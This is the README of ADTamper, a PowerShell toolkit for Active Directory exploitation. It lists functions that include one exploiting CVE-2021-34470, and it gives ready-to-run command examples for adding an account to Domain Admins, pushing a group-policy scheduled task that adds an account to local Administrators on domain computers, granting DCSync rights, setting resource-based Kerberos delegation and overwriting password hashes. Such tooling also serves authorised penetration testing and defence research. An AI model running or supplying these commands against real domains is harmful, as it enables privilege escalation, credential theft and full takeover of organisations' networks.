# ADTamper

ADTamper is a PowerShell tool for Active Directory exploitation.

## Functions

```
New-UserAccount                 -   creates a new user account in a given Active Directory domain
New-ComputerAccount             -   creates a new computer account in a given Active Directory domain
New-RogueAccount                -   creates a new Active Directory account (user or computer) by exploiting CVE-2021-34470
New-DomainDnsRecord             -   creates a new DNS record in a given Active Directory domain
New-GPImmediateTask             -   creates an immediate scheduled task to push out through a given Active Directory group policy
Add-GPGroupMember               -   adds a domain account to a local group through a given Active Directory group policy
Add-GPUserRightsAssignment      -   adds user rights to a domain account through a given Active Directory group policy
Set-UserPassword                -   modifies the password of a given Active Directory account
Set-UserNTHash                  -   modifies the password hash of a given Active Directory account
Set-KerberosDelegation          -   adds or removes a Kerberos delegation for a given Active Directory account
Set-LdapObject                  -   modifies properties for a given Active Directory object (e.g. members of a group)
Set-LdapObjectOwner             -   modifies the owner for a given Active Directory object
Set-LdapObjectAcl               -   adds or removes an ACL for a given Active Directory object
Remove-LdapObject               -   removes a given Active Directory object
```

## Examples

* Create a domain computer account:

```
New-ComputerAccount -SamAccountName 'testcomputer$' -Password 'P@ssw0rd'
```

* Reset the password of a domain account:

```
Set-UserPassword -SamAccountName 'testcomputer$' -NewPassword 'Str0ngP@ssw0rd' -Reset
```

* Add a DNS record to an Active Directory-Integrated DNS (ADIDNS) zone:

```
New-DomainDnsRecord -RecordType A -Name 'testcomputer' -ZoneName 'adatum.corp' -Data '192.168.1.200'
```

* Configure a Kerberos Resource-Based Delegation for a domain account that is going to be allowed to delegate authentication on an targeted system:

```
Set-KerberosDelegation -SamAccountName 'testcomputer$' -RBCD -TargetDN 'CN=WS10,CN=Computers,DC=ADATUM,DC=CORP' -Operation Add
```

* Add a domain account to an existing domain group:

```
Set-LdapObject -DistinguishedName 'CN=Domain Admins,CN=Users,DC=ADATUM,DC=CORP' -Properties @{member='CN=testcomputer,CN=Computers,DC=ADATUM,DC=CORP'} -Operation Add
```

* Add a domain account to the Administrators local group of domain computers:

```
$id = (Get-LdapObject -Filter "(&(objectCategory=groupPolicyContainer)(DisplayName=Default Domain Policy))" -Properties cn).cn
New-GPImmediateTask -PolicyId $id -Command 'cmd.exe' -CommandArguments '/c net localgroup Administrators testcomputer$ /add' -Scope Computer
```

* Assign 'DCSync' extended rights to a domain account:

```
$sid = (New-Object Security.Principal.SecurityIdentifier (Get-LdapObject -Filter '(sAMAccountName=testcomputer$)').objectSid,0).Value
Set-LdapObjectAcl -DistinguishedName "DC=ADATUM,DC=CORP" -PrincipalSID $sid -Rights DCSync -Operation Add
```

* Delete a domain account:

```
Remove-LdapObject -DistinguishedName 'CN=testcomputer,CN=Computers,DC=ADATUM,DC=CORP'
```
